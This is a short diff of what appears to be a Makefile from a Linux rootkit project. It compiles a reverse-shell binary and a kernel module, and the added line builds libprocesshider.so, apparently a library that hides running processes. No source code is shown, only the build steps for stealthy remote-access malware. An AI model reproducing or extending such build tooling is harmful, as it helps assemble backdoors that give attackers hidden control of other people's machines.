@@ -11,5 +11,6 @@ else
 default:
 	sh scripts/lets_maK_it.sh
 	gcc -Wall -m32 -s -o shells/revshell shells/revshell.c
+	gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 	make -C $(KERNELDIR) M=$(PWD) modules
 endif
